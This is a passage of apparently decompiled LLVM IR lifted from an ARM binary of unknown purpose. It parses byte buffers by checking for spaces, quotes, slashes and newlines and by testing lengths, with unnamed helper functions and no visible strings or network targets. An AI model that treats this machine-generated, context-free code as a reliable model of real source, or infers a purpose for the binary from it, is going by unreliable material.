  %v3_9780 = inttoptr i32 %v2_9780 to i8*
  store i8 0, i8* %v3_9780, align 1
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9788 = load i32, i32* %stack_var_-40, align 4
  %v1_978c = add i32 %v3_9788, 1
  store i32 %v1_978c, i32* %ip.global-to-local, align 4
  store i32 %v1_978c, i32* %stack_var_-40, align 4
  %v0_9794 = load i32, i32* @r6, align 4
  %v2_9794 = add i32 %v0_9794, %v1_978c
  %v3_9794 = inttoptr i32 %v2_9794 to i8*
  %v4_9794 = load i8, i8* %v3_9794, align 1
  %v6_9794 = zext i8 %v4_9794 to i32
  store i32 %v6_9794, i32* %r3.global-to-local, align 4
  %v2_9798 = icmp ugt i8 %v4_9794, 31
  store i1 %v2_9798, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9798 = icmp ult i8 %v4_9794, 32
  store i1 %v6_9798, i1* %cpsr_n.global-to-local, align 1
  %v7_9798 = icmp eq i8 %v4_9794, 32
  store i1 %v7_9798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9798, label %bb233, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_977c
  store i32 %v2_9794, i32* @r4, align 4
  br label %bb234

bb233:                                            ; preds = %dec_label_pc_977c
  %v2_979c = add i32 %v3_9788, 2
  store i32 %v2_979c, i32* %ip.global-to-local, align 4
  %v2_97a0 = add i32 %v0_9794, %v2_979c
  store i32 %v2_97a0, i32* @r4, align 4
  store i32 %v2_979c, i32* %stack_var_-40, align 4
  br label %bb234

bb234:                                            ; preds = %.thread56, %bb233
  %v0_97a8 = phi i32 [ %v2_9794, %.thread56 ], [ %v2_97a0, %bb233 ]
  store i32 %v0_97a8, i32* %r0.global-to-local, align 4
  %v1_97ac = inttoptr i32 %v0_97a8 to i8*
  %v2_97ac = call i32 @function_12c94(i8* %v1_97ac)
  store i32 ptrtoint ([5 x i8]* @global_var_15f48.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97ac, i32* @r1, align 4
  %v0_97b8 = load i32, i32* @r4, align 4
  store i32 %v0_97b8, i32* %r0.global-to-local, align 4
  %v4_97bc = inttoptr i32 %v0_97b8 to i8*
  %v5_97bc = call i32 @function_12fe8(i8* %v4_97bc, i32 %v2_97ac, i32 ptrtoint ([5 x i8]* @global_var_15f48.46 to i32))
  store i32 %v5_97bc, i32* %r0.global-to-local, align 4
  %v1_97c0 = add i32 %v5_97bc, 1
  %v2_97c0 = icmp eq i32 %v5_97bc, -1
  store i1 %v2_97c0, i1* %cpsr_c.global-to-local, align 1
  %v3_97c0 = sub i32 0, %v5_97bc
  %v4_97c0 = and i32 %v1_97c0, %v3_97c0
  %v5_97c0 = icmp slt i32 %v4_97c0, 0
  store i1 %v5_97c0, i1* %cpsr_v.global-to-local, align 1
  %v6_97c0 = icmp slt i32 %v1_97c0, 0
  store i1 %v6_97c0, i1* %cpsr_n.global-to-local, align 1
  %v7_97c0 = icmp eq i32 %v1_97c0, 0
  store i1 %v7_97c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97c0, label %.thread60, label %dec_label_pc_97d0

.thread60:                                        ; preds = %bb234
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v4_97c8 = load i32, i32* %v11_82f4, align 4
  store i32 %v4_97c8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97d0:                                ; preds = %bb234
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_97d4 = load i32, i32* %stack_var_-40, align 4
  %v0_97d8 = load i32, i32* @r6, align 4
  %v2_97d8 = add i32 %v0_97d8, %v3_97d4
  store i32 %v2_97d8, i32* @r4, align 4
  store i32 %v2_97d8, i32* %r0.global-to-local, align 4
  %v1_97e0 = inttoptr i32 %v2_97d8 to i8*
  %v2_97e0 = call i32 @function_12c94(i8* %v1_97e0)
  store i32 ptrtoint ([5 x i8]* @global_var_15f48.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_97e0, i32* @r1, align 4
  %v0_97ec = load i32, i32* @r4, align 4
  store i32 %v0_97ec, i32* %r0.global-to-local, align 4
  %v4_97f0 = inttoptr i32 %v0_97ec to i8*
  %v5_97f0 = call i32 @function_12fe8(i8* %v4_97f0, i32 %v2_97e0, i32 ptrtoint ([5 x i8]* @global_var_15f48.46 to i32))
  store i32 %v5_97f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_97f8 = load i32, i32* %stack_var_-40, align 4
  %v2_97fc = add i32 %v3_97f8, %v5_97f0
  store i32 %v2_97fc, i32* %ip.global-to-local, align 4
  store i32 %v2_97fc, i32* %stack_var_-40, align 4
  br label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %.thread60, %dec_label_pc_97d0
  %v0_9d8c = phi i32 [ %v4_97c8, %.thread60 ], [ %v2_97fc, %dec_label_pc_97d0 ]
  %v0_9804 = load i32, i32* @r6, align 4
  %v2_9804 = add i32 %v0_9804, %v0_9d8c
  %v3_9804 = inttoptr i32 %v2_9804 to i8*
  %v4_9804 = load i8, i8* %v3_9804, align 1
  %v6_9804 = zext i8 %v4_9804 to i32
  store i32 %v6_9804, i32* %r3.global-to-local, align 4
  %v2_9808 = icmp ugt i8 %v4_9804, 33
  store i1 %v2_9808, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9808 = icmp ult i8 %v4_9804, 34
  store i1 %v6_9808, i1* %cpsr_n.global-to-local, align 1
  %v7_9808 = icmp eq i8 %v4_9804, 34
  store i1 %v7_9808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9808, label %dec_label_pc_9d8c, label %dec_label_pc_9810

dec_label_pc_9810:                                ; preds = %dec_label_pc_9d8c, %dec_label_pc_9804, %dec_label_pc_9db4
  %v0_9810 = load i32, i32* @r6, align 4
  store i32 %v0_9810, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_9818 = inttoptr i32 %v0_9810 to i8*
  %v3_9818 = call i32 @function_12dc0(i8* %v2_9818, i32 10)
  store i32 %v3_9818, i32* %r0.global-to-local, align 4
  %v1_981c = add i32 %v3_9818, -1
  store i32 %v1_981c, i32* %r3.global-to-local, align 4
  %v1_9820 = add i32 %v3_9818, -9
  %v2_9820 = icmp ugt i32 %v1_981c, 7
  store i1 %v2_9820, i1* %cpsr_c.global-to-local, align 1
  %v3_9820 = sub i32 8, %v3_9818
  %v4_9820 = and i32 %v3_9820, %v1_981c
  %v5_9820 = icmp slt i32 %v4_9820, 0
  store i1 %v5_9820, i1* %cpsr_v.global-to-local, align 1
  %v6_9820 = icmp slt i32 %v1_9820, 0
  store i1 %v6_9820, i1* %cpsr_n.global-to-local, align 1
  %v7_9820 = icmp eq i32 %v1_981c, 8
  store i1 %v7_9820, i1* %cpsr_z.global-to-local, align 1
  %v2_9824 = xor i1 %v2_9820, true
  %v3_9824 = or i1 %v7_9820, %v2_9824
  br i1 %v3_9824, label %dec_label_pc_9838.preheader, label %dec_label_pc_984c

dec_label_pc_9838.preheader:                      ; preds = %dec_label_pc_9810
  store i32 %v2_87d8, i32* %ip.global-to-local, align 4
  %v6_9828 = add i32 %v3_9818, %v2_87d8
  store i32 %v6_9828, i32* @r4, align 4
  br label %dec_label_pc_9838

dec_label_pc_9834:                                ; preds = %dec_label_pc_9838
  %v1_9834 = call i32 @function_14a84(i32 1)
  store i32 %v1_9834, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9838

dec_label_pc_9838:                                ; preds = %dec_label_pc_9838.preheader, %dec_label_pc_9834
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_983c = call i32 @function_13924(i32* null)
  %v1_9840 = load i32, i32* @r4, align 4
  %v2_9840 = sub i32 %v2_983c, %v1_9840
  %v3_9840 = icmp uge i32 %v2_983c, %v1_9840
  store i1 %v3_9840, i1* %cpsr_c.global-to-local, align 1
  %v4_9840 = xor i32 %v1_9840, %v2_983c
  %v5_9840 = xor i32 %v2_9840, %v2_983c
  %v6_9840 = and i32 %v5_9840, %v4_9840
  %v7_9840 = icmp slt i32 %v6_9840, 0
  store i1 %v7_9840, i1* %cpsr_v.global-to-local, align 1
  %v8_9840 = icmp slt i32 %v2_9840, 0
  store i1 %v8_9840, i1* %cpsr_n.global-to-local, align 1
  %v9_9840 = icmp eq i32 %v2_983c, %v1_9840
  store i1 %v9_9840, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_9840, label %dec_label_pc_984c, label %dec_label_pc_9834

dec_label_pc_984c:                                ; preds = %dec_label_pc_9838, %dec_label_pc_9810
  store i32 %v10_82f0, i32* @lr, align 4
  %v3_9850 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_9850, i32* @r4, align 4
  %v0_9854 = load i32, i32* @r6, align 4
  %v2_9854 = add i32 %v0_9854, %v3_9850
  store i32 %v2_9854, i32* @r5, align 4
  store i32 %v2_9854, i32* %r0.global-to-local, align 4
  %v1_985c = inttoptr i32 %v2_9854 to i8*
  %v2_985c = call i32 @function_12c94(i8* %v1_985c)
  store i32 ptrtoint ([5 x i8]* @global_var_15f40.44 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_985c, i32* @r1, align 4
  %v0_9868 = load i32, i32* @r5, align 4
  store i32 %v0_9868, i32* %r0.global-to-local, align 4
  %v4_986c = inttoptr i32 %v0_9868 to i8*
  %v5_986c = call i32 @function_12fe8(i8* %v4_986c, i32 %v2_985c, i32 ptrtoint ([5 x i8]* @global_var_15f40.44 to i32))
  store i32 %v5_986c, i32* %r0.global-to-local, align 4
  %v1_9870 = add i32 %v5_986c, -4
  %v2_9870 = icmp ugt i32 %v5_986c, 3
  store i1 %v2_9870, i1* %cpsr_c.global-to-local, align 1
  %v3_9870 = sub i32 3, %v5_986c
  %v4_9870 = and i32 %v3_9870, %v5_986c
  %v5_9870 = icmp slt i32 %v4_9870, 0
  store i1 %v5_9870, i1* %cpsr_v.global-to-local, align 1
  %v6_9870 = icmp slt i32 %v1_9870, 0
  store i1 %v6_9870, i1* %cpsr_n.global-to-local, align 1
  %v7_9870 = icmp eq i32 %v5_986c, 4
  store i1 %v7_9870, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9870, label %dec_label_pc_9c68, label %dec_label_pc_9878

dec_label_pc_9878:                                ; preds = %dec_label_pc_984c
  %v0_9878 = load i32, i32* @r6, align 4
  %v1_9878 = load i32, i32* @r4, align 4
  %v2_9878 = add i32 %v1_9878, %v0_9878
  %v3_9878 = inttoptr i32 %v2_9878 to i8*
  %v4_9878 = load i8, i8* %v3_9878, align 1
  %v6_9878 = zext i8 %v4_9878 to i32
  store i32 %v6_9878, i32* %r3.global-to-local, align 4
  %v2_987c = icmp ugt i8 %v4_9878, 46
  store i1 %v2_987c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_987c = icmp ult i8 %v4_9878, 47
  store i1 %v6_987c, i1* %cpsr_n.global-to-local, align 1
  %v7_987c = icmp eq i8 %v4_9878, 47
  store i1 %v7_987c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_987c, label %dec_label_pc_9de0, label %dec_label_pc_9884

dec_label_pc_9884:                                ; preds = %dec_label_pc_9dfc, %dec_label_pc_9de0, %dec_label_pc_9d38, %dec_label_pc_9d1c, %dec_label_pc_9878, %dec_label_pc_9e2c, %dec_label_pc_9d68
  %v0_9884 = load i32, i32* %sb.global-to-local, align 4
  %v1_9888 = add i32 %v0_9884, 1431
  store i32 %v1_9888, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v4_9894 = call i32 @function_13c70(i32 %v1_9888, i32 ptrtoint ([4 x i8]* @global_var_15f1c.21 to i32), i32 4)
  store i32 %v4_9894, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_989c = load i32, i32* @r8, align 4
  %v3_989c = add i32 %v2_989c, -1452
  %v4_989c = inttoptr i32 %v3_989c to i8*
  store i8 10, i8* %v4_989c, align 1
  br label %dec_label_pc_8838

dec_label_pc_98a4:                                ; preds = %dec_label_pc_8610
  store i32 %v1_8610, i32* %r3.global-to-local, align 4
  %v1_98a8 = trunc i32 %v1_8610 to i8
  store i8 %v1_98a8, i8* %v2_8650, align 1
  %v0_98ac = load i32, i32* @r6, align 4
  %v1_98ac = add i32 %v0_98ac, -1431
  %v2_98ac = inttoptr i32 %v1_98ac to i32*
  %v3_98ac = load i32, i32* %v2_98ac, align 4
  store i32 %v3_98ac, i32* %r0.global-to-local, align 4
  %v1_98b0 = call i32 @function_13654(i32 %v3_98ac)
  store i32 %v1_98b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_98b8 = load i32, i32* @r6, align 4
  %v2_98b8 = add i32 %v1_98b8, -1431
  %v3_98b8 = inttoptr i32 %v2_98b8 to i32*
  store i32 -1, i32* %v3_98b8, align 4
  br label %dec_label_pc_8630

dec_label_pc_98c0:                                ; preds = %dec_label_pc_9774, %dec_label_pc_96a4, %dec_label_pc_9678
  %v0_98c0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98c0, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  %v5_98d0 = call i32 @function_12d58(i32 %v2_8280, i32 %v0_98c0, i32 ptrtoint ([5 x i8]* @global_var_15f34.40 to i32), i32 4)
  %v0_98d4 = load i32, i32* %sb.global-to-local, align 4
  %v1_98d8 = add i32 %v0_98d4, 1431
  store i32 %v1_98d8, i32* @r4, align 4
  store i32 %v5_98d0, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f50.48 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_98d8, i32* %r0.global-to-local, align 4
  %v3_98e8 = inttoptr i32 %v1_98d8 to i8*
  %v4_98e8 = call i32 @function_13074(i8* %v3_98e8, i32 ptrtoint ([5 x i8]* @global_var_15f50.48 to i32))
  store i32 %v4_98e8, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_98ec = icmp slt i32 %v4_98e8, 0
  store i1 %v1_98ec, i1* %cpsr_n.global-to-local, align 1
  %v2_98ec = icmp eq i32 %v4_98e8, 0
  store i1 %v2_98ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_98ec, label %dec_label_pc_9aa8, label %dec_label_pc_98f4

dec_label_pc_98f4:                                ; preds = %dec_label_pc_9aa8, %dec_label_pc_98c0
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_98f8 = load i32, i32* @r8, align 4
  %v3_98f8 = add i32 %v2_98f8, -1452
  %v4_98f8 = inttoptr i32 %v3_98f8 to i8*
  store i8 7, i8* %v4_98f8, align 1
  br label %dec_label_pc_98fc

dec_label_pc_98fc:                                ; preds = %bb240, %dec_label_pc_98f4
  %v0_98fc = load i32, i32* @r5, align 4
  store i32 %v0_98fc, i32* %r2.global-to-local, align 4
  %v0_9900 = load i32, i32* @r8, align 4
  %v1_9900 = add i32 %v0_9900, -1456
  %v2_9900 = inttoptr i32 %v1_9900 to i32*
  %v3_9900 = load i32, i32* %v2_9900, align 4
  store i32 %v3_9900, i32* %r0.global-to-local, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_990c = call i32 @function_13e60(i32 %v3_9900, i32* nonnull %stack_var_-20809, i32 %v0_98fc, i32 16384)
  store i32 %v5_990c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8838

dec_label_pc_9914:                                ; preds = %dec_label_pc_8e04
  %v2_9914 = add i32 %v0_9914, -10240
  %v3_9914 = icmp ugt i32 %v0_9914, 10239
  store i1 %v3_9914, i1* %cpsr_c.global-to-local, align 1
  %v4_9914 = sub i32 10239, %v0_9914
  %v5_9914 = and i32 %v4_9914, %v0_9914
  %v6_9914 = icmp slt i32 %v5_9914, 0
  store i1 %v6_9914, i1* %cpsr_v.global-to-local, align 1
  %v7_9914 = icmp slt i32 %v2_9914, 0
  store i1 %v7_9914, i1* %cpsr_n.global-to-local, align 1
  %v8_9914 = icmp eq i32 %v0_9914, 10240
  store i1 %v8_9914, i1* %cpsr_z.global-to-local, align 1
  %v5_9918 = icmp slt i32 %v0_9914, 10240
  br i1 %v5_9918, label %dec_label_pc_8838, label %dec_label_pc_8e20

dec_label_pc_9920:                                ; preds = %dec_label_pc_9628
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9924 = load i32, i32* @r4, align 4
  %v2_9924 = inttoptr i32 %v1_9924 to i32*
  store i32 104, i32* %v2_9924, align 4
  br label %dec_label_pc_965c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9430
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9930 = load i32, i32* %fp.global-to-local, align 4
  %v2_9930 = inttoptr i32 %v1_9930 to i32*
  store i32 104, i32* %v2_9930, align 4
  br label %dec_label_pc_9934

dec_label_pc_9934:                                ; preds = %dec_label_pc_9950, %dec_label_pc_992c
  %v0_9934 = load i32, i32* @r8, align 4
  %v1_9934 = add i32 %v0_9934, -1456
  %v2_9934 = inttoptr i32 %v1_9934 to i32*
  %v3_9934 = load i32, i32* %v2_9934, align 4
  store i32 %v3_9934, i32* %r0.global-to-local, align 4
  %v1_9938 = call i32 @function_13654(i32 %v3_9934)
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_9944 = load i32, i32* @r8, align 4
  %v2_9944 = add i32 %v1_9944, -1456
  %v3_9944 = inttoptr i32 %v2_9944 to i32*
  store i32 -1, i32* %v3_9944, align 4
  %v0_9948 = load i32, i32* %lr.global-to-local, align 4
  %v1_9948 = trunc i32 %v0_9948 to i8
  %v2_9948 = load i32, i32* @r8, align 4
  %v3_9948 = add i32 %v2_9948, -1452
  %v4_9948 = inttoptr i32 %v3_9948 to i8*
  store i8 %v1_9948, i8* %v4_9948, align 1
  br label %dec_label_pc_8838

dec_label_pc_9950:                                ; preds = %dec_label_pc_9458
  %v0_9950 = load i32, i32* %fp.global-to-local, align 4
  %v1_9950 = inttoptr i32 %v0_9950 to i32*
  %v2_9950 = load i32, i32* %v1_9950, align 4
  store i32 %v2_9950, i32* %r3.global-to-local, align 4
  %v1_9954 = add i32 %v2_9950, -11
  %v2_9954 = icmp ugt i32 %v2_9950, 10
  store i1 %v2_9954, i1* %cpsr_c.global-to-local, align 1
  %v3_9954 = sub i32 10, %v2_9950
  %v4_9954 = and i32 %v3_9954, %v2_9950
  %v5_9954 = icmp slt i32 %v4_9954, 0
  store i1 %v5_9954, i1* %cpsr_v.global-to-local, align 1
  %v6_9954 = icmp slt i32 %v1_9954, 0
  store i1 %v6_9954, i1* %cpsr_n.global-to-local, align 1
  %v7_9954 = icmp eq i32 %v2_9950, 11
  store i1 %v7_9954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9954, label %dec_label_pc_8838, label %dec_label_pc_9934

dec_label_pc_9960:                                ; preds = %bb230
  store i32 7, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  store i32 7, i32* %stack_var_-40, align 4
  %v0_996c = load i32, i32* @r5, align 4
  %v1_996c = add i32 %v0_996c, 4
  %v2_996c = inttoptr i32 %v1_996c to i8*
  %v3_996c = load i8, i8* %v2_996c, align 1
  %v4_996c = zext i8 %v3_996c to i32
  store i32 %v4_996c, i32* %r3.global-to-local, align 4
  %v2_9970 = icmp ugt i8 %v3_996c, 114
  store i1 %v2_9970, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_9970 = icmp ult i8 %v3_996c, 115
  store i1 %v6_9970, i1* %cpsr_n.global-to-local, align 1
  %v7_9970 = icmp eq i8 %v3_996c, 115
  store i1 %v7_9970, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9970, label %bb235, label %.thread63

bb235:                                            ; preds = %dec_label_pc_9960
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 8, i32* %stack_var_-40, align 4
  br label %.thread63

.thread63:                                        ; preds = %dec_label_pc_9960, %bb235
  %v3_9980 = phi i32 [ 7, %dec_label_pc_9960 ], [ 8, %bb235 ]
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  store i32 %v0_996c, i32* @r0, align 4
  %v1_9988 = load i32, i32* %r6.global-to-local, align 4
  %v2_9988 = sub i32 %v1_9988, %v3_9980
  store i32 %v2_9988, i32* @r2, align 4
  %v2_998c = add i32 %v3_9980, %v0_996c
  store i32 %v2_998c, i32* @r1, align 4
  %v3_9990 = call i32 @function_13c80(i32 %v0_996c, i32 %v2_998c, i32 %v2_9988)
  store i32 %v3_9990, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v0_9998 = load i32, i32* @r7, align 4
  store i32 %v0_9998, i32* %stack_var_-40, align 4
  store i32 %v2_8280, i32* %r1.global-to-local, align 4
  %v1_99a0 = load i32, i32* @r4, align 4
  %v2_99a0 = add i32 %v1_99a0, %v2_8280
  %v3_99a0 = inttoptr i32 %v2_99a0 to i8*
  %v4_99a0 = load i8, i8* %v3_99a0, align 1
  %v6_99a0 = zext i8 %v4_99a0 to i32
  store i32 %v6_99a0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99a4 = icmp eq i8 %v4_99a0, 0
  store i1 %v2_99a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_99a4, label %dec_label_pc_99e8, label %dec_label_pc_99ac

dec_label_pc_99ac:                                ; preds = %.thread63
  %v2_99ac = icmp ugt i8 %v4_99a0, 46
  store i1 %v2_99ac, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99ac = icmp ult i8 %v4_99a0, 47
  store i1 %v6_99ac, i1* %cpsr_n.global-to-local, align 1
  %v7_99ac = icmp eq i8 %v4_99a0, 47
  store i1 %v7_99ac, i1* %cpsr_z.global-to-local, align 1
  %v1_99b0 = load i32, i32* @r5, align 4
  br i1 %v7_99ac, label %bb236, label %dec_label_pc_99b8

bb236:                                            ; preds = %dec_label_pc_99ac
  store i32 %v1_99b0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9b48

dec_label_pc_99b8:                                ; preds = %dec_label_pc_99ac
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_99c8

dec_label_pc_99c0:                                ; preds = %dec_label_pc_99c8
  %v2_99c0 = icmp ugt i8 %v4_99d4, 46
  store i1 %v2_99c0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_99c0 = icmp ult i8 %v4_99d4, 47
  store i1 %v6_99c0, i1* %cpsr_n.global-to-local, align 1
  %v7_99c0 = icmp eq i8 %v4_99d4, 47
  store i1 %v7_99c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99c0, label %dec_label_pc_9b48, label %dec_label_pc_99c8

dec_label_pc_99c8:                                ; preds = %dec_label_pc_99c0, %dec_label_pc_99b8
  %v0_99dc = phi i32 [ %v1_99dc, %dec_label_pc_99c0 ], [ 1, %dec_label_pc_99b8 ]
  store i32 %v0_99dc, i32* %ip.global-to-local, align 4
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  store i32 %v0_99dc, i32* %stack_var_-40, align 4
  %v2_99d4 = add i32 %v0_99dc, %v1_99b0
  %v3_99d4 = inttoptr i32 %v2_99d4 to i8*
  %v4_99d4 = load i8, i8* %v3_99d4, align 1
  %v6_99d4 = zext i8 %v4_99d4 to i32
  store i32 %v6_99d4, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_99d8 = icmp eq i8 %v4_99d4, 0
  store i1 %v2_99d8, i1* %cpsr_z.global-to-local, align 1
  %v1_99dc = add i32 %v0_99dc, 1
  store i32 %v1_99dc, i32* %r3.global-to-local, align 4
  store i32 %v2_99d4, i32* %r1.global-to-local, align 4
  br i1 %v2_99d8, label %dec_label_pc_99e8, label %dec_label_pc_99c0

dec_label_pc_99e8:                                ; preds = %dec_label_pc_99c8, %.thread63, %dec_label_pc_9b48
  %v0_99e8 = load i32, i32* @r5, align 4
  store i32 %v0_99e8, i32* %r0.global-to-local, align 4
  %v1_99ec = inttoptr i32 %v0_99e8 to i8*
  %v2_99ec = call i32 @function_12c94(i8* %v1_99ec)
  store i32 %v2_99ec, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_99f0 = icmp slt i32 %v2_99ec, 0
  store i1 %v1_99f0, i1* %cpsr_n.global-to-local, align 1
  %v2_99f0 = icmp eq i32 %v2_99ec, 0
  store i1 %v2_99f0, i1* %cpsr_z.global-to-local, align 1
  %tmp237 = icmp slt i32 %v2_99ec, 1
  br i1 %tmp237, label %dec_label_pc_9a14, label %dec_label_pc_99f8

dec_label_pc_99f8:                                ; preds = %dec_label_pc_99e8
  %v0_99f8 = load i32, i32* @r5, align 4
  store i32 %v0_99f8, i32* %r0.global-to-local, align 4
  %v1_99fc = inttoptr i32 %v0_99f8 to i8*
  %v2_99fc = call i32 @function_12c94(i8* %v1_99fc)
  store i32 %v2_99fc, i32* %r0.global-to-local, align 4
  %v1_9a00 = add i32 %v2_99fc, -127
  %v2_9a00 = icmp ugt i32 %v2_99fc, 126
  store i1 %v2_9a00, i1* %cpsr_c.global-to-local, align 1
  %v3_9a00 = sub i32 126, %v2_99fc
  %v4_9a00 = and i32 %v3_9a00, %v2_99fc
  %v5_9a00 = icmp slt i32 %v4_9a00, 0
  store i1 %v5_9a00, i1* %cpsr_v.global-to-local, align 1
  %v6_9a00 = icmp slt i32 %v1_9a00, 0
  store i1 %v6_9a00, i1* %cpsr_n.global-to-local, align 1
  %v7_9a00 = icmp eq i32 %v2_99fc, 127
  store i1 %v7_9a00, i1* %cpsr_z.global-to-local, align 1
  %v7_9a04 = icmp sgt i32 %v2_99fc, 127
  br i1 %v7_9a04, label %.thread66, label %bb238

bb238:                                            ; preds = %dec_label_pc_99f8
  %v8_9a04 = load i32, i32* %sb.global-to-local, align 4
  %v9_9a08 = add i32 %v8_9a04, 789
  store i32 %v9_9a08, i32* %r0.global-to-local, align 4
  %v8_9a0c = load i32, i32* @r5, align 4
  store i32 %v8_9a0c, i32* %r1.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %dec_label_pc_99f8, %bb238
  store i32 39444, i32* %lr.global-to-local, align 4
  %v3_9a10 = xor i1 %v6_9a00, %v5_9a00
  %v4_9a10 = or i1 %v7_9a00, %v3_9a10
  call void @__pseudo_cond_branch(i1 %v4_9a10, i32 ptrtoint (i32* @global_var_12cbc.49 to i32))
  br label %dec_label_pc_9a14

dec_label_pc_9a14:                                ; preds = %dec_label_pc_99e8, %.thread66
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9a18 = load i32, i32* %stack_var_-40, align 4
  %v0_9a1c = load i32, i32* @r5, align 4
  %v2_9a1c = add i32 %v3_9a18, 1
  %v1_9a20 = add i32 %v2_9a1c, %v0_9a1c
  store i32 %v1_9a20, i32* %r0.global-to-local, align 4
  %v1_9a24 = inttoptr i32 %v1_9a20 to i8*
  %v2_9a24 = call i32 @function_12c94(i8* %v1_9a24)
  store i32 %v2_9a24, i32* %r0.global-to-local, align 4
  %v1_9a28 = add i32 %v2_9a24, -255
  %v2_9a28 = icmp ugt i32 %v2_9a24, 254
  store i1 %v2_9a28, i1* %cpsr_c.global-to-local, align 1
  %v3_9a28 = sub i32 254, %v2_9a24
  %v4_9a28 = and i32 %v3_9a28, %v2_9a24
  %v5_9a28 = icmp slt i32 %v4_9a28, 0
  store i1 %v5_9a28, i1* %cpsr_v.global-to-local, align 1
  %v6_9a28 = icmp slt i32 %v1_9a28, 0
  store i1 %v6_9a28, i1* %cpsr_n.global-to-local, align 1
  %v7_9a28 = icmp eq i32 %v2_9a24, 255
  store i1 %v7_9a28, i1* %cpsr_z.global-to-local, align 1
  %v8_9a2c = icmp sgt i32 %v2_9a24, 255
  br i1 %v8_9a2c, label %dec_label_pc_9400, label %dec_label_pc_9a30

dec_label_pc_9a30:                                ; preds = %dec_label_pc_9a14
  %v0_9a30 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a34 = add i32 %v0_9a30, 533
  store i32 %v1_9a34, i32* @r4, align 4
  store i32 %v1_9a34, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9a40 = call i32 @function_12d34(i32 %v1_9a34, i32 255)
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v3_9a48 = load i32, i32* %stack_var_-40, align 4
  %v0_9a4c = load i32, i32* @r5, align 4
  %v2_9a4c = add i32 %v3_9a48, 1
  %v1_9a50 = add i32 %v2_9a4c, %v0_9a4c
  store i32 %v1_9a50, i32* %r0.global-to-local, align 4
